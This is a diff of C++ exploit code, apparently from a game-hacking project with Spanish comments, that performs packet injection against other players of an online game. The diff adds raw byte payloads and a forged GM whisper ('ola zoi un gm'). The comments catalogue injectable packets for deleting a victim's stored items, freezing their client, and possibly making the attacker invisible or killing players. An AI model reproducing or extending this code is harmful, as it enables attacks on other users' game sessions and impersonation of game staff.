@@ -159,31 +159,60 @@ void Command::_packet_injection(){
 	ejecuciones, poniendo otro paquete malicioso en vez del paquete final.
 
 	Paquetes sin nullbytes:
-		whisper: lo que se hace ahora
-		TPacketGCItemDel (HEADER_GC_SAFEBOX_DEL o HEADER_GC_MALL_DEL): borrar cosas del almacen
-		TPacketGCPhase: poner PHASE_DEAD, parece que es cuando el player se muere
-		puede que chat
-		puede que TPacketGCPoints (HEADER_GC_CHARACTER_POINTS), pero no soy capaz de recibirlo
+		whisper: enviar mensaje, posiblemente como gm
+		TPacketGCItemDel (HEADER_GC_SAFEBOX_DEL o HEADER_GC_MALL_DEL): borrar cosas del almacen mientras esté abierto
+		TPacketGCPhase: hace que el jugador solo vea el mapa y la UI y no pueda hacer nada
+		puede que chat: creo que no, lo que pongo como nullbytes es el id del que habla y tiene nullbyte
+		puede que TPacketGCPoints (HEADER_GC_CHARACTER_POINTS). no soy capaz de recibirlo, y es muuy largo (255 ints)
 		HEADER_GC_QUICKSLOT_ADD, HEADER_GC_QUICKSLOT_DEL, HEADER_GC_QUICKSLOT_SWAP: no muy util
-		puede que TPacketGCShop
-		puede que TPacketGCDuelStart
-		puede que TPacketGCWarp? comprobar en OX
-		TPacketGCGuild
-		TPacketGCChangeSkillGroup
-		TPacketGCNPCPosition puede estar gracioso
+		puede que TPacketGCWarp: parece que hacen falta unos ids que solo estan en el sv y seguro que tienen nullbytes, aunque hace cosas raras
+			"\x04\x01\x01\x06\x01\x01\x01\x01\x03\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
 		TPacketGCTargetCreate: si consigo crear un target con un id sin nullbytes puedo hacer muchas cosas
-		TPacketGCLoverInfo, TPacketGCLovePointUpdate XD
+			Tiene pinta que lo crea pero las coordenadas X e Y tienen que tener nullbytes :(
+			string packet = "\x7D\x01\x01\x01\x01";
+			packet += "LAMADREQUELAPARIOAMENDIOSLAVIRGEN";
+			packet += "\x01\x01\x01\x01\x01";
+		TPacketGCLoverInfo, TPacketGCLovePointUpdate: parece que llegan bien pero npi de que hacen
+			string packet = "\x83";
+			packet += "HOLAQUETALMUCHOGUSTOJEJEJ";
+			packet += "\x20";
+	
+	Si pudiera meter un solo nullbyte al final podria hacer muchas mas cosas, como por ejemplo
+	GC_CharacterDel para volverme invisible, o tmb TPacketGCDead para matar a alguien
+	Merece la pena investigar cómo.
+
+	Haga lo que haga parece imposible meter un nullbyte en el paquete del whisper.
+	Si lo meto, ahí termina el paquete, independientemente de la longitud que le haya puesto,
+	y eso es lo que le llega al usuario, y justo después el siguiente paquete válido que enviamos.
+	Podría meter un nullbyte al final si hubiera algún paquete cuyo header fuera '\x00',
+	pero no lo hay.
+
+	Lo suyo sería que después del paquete malicioso no hubiera nada más para poder aprovechar
+	un posible nullbyte que hubiera en el buffer. Pero si no meto nada después del malicious
+	packet no ocurre el bug, y siempre ocurre en la misma posición que no es al final.
+
+	Me rindo
 	*/
+
+	// VER POR QUE LECHES HA DEJADO DE FUNCIONAR DE REPENTE
 
 	// MALICIOUS PACKET
 	// whisper
+
 	string username = "Lord Klecko";
 	string msg = "ola zoi un gm";
+	byte type = 5; // 5 for gm, 0xFF for system
 
+	// packet size: 0x101 ('\x01\x01'), minimum size with no nullbytes
 	username += string(25 - username.length(), ' ');
 	msg += string(0x101 - 25 - 4 - msg.length(), ' ');
-	string packet = GC_Whisper(5, username, msg).get_buf();
+	string packet = GC_Whisper(type, username, msg).get_buf();
 
+	// phase
+	//string packet = "\xFD\x01";
+
+	// delete from safebox
+	//string packet = "\x56\x01";
 
 	cout << "Performing packet injection to " << instance->username_dc << endl;
 	int i;
